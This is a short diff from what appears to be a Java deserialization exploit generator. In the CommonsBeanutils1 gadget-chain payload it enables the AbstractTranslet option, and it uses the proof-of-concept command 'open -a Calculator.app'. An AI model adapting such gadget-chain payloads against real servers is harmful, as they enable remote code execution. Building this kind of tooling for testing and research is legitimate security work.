@@ -28,7 +28,7 @@ public class CommonsBeanutils1 implements ObjectPayload<Object> {
         sinksHelper.setCommand("open -a Calculator.app");
 //        sinksHelper.setCommand("whoami");
         JavaClassHelper javaClassHelper = new JavaClassHelper();
-//        javaClassHelper.setExtendsAbstractTranslet(true);
+        javaClassHelper.setExtendsAbstractTranslet(true);
 //        javaClassHelper.setRandomJavaClassName(true);
         sinksHelper.setJavaClassHelper(javaClassHelper);
         PayloadRunner.run(CommonsBeanutils1.class, args, sinksHelper);
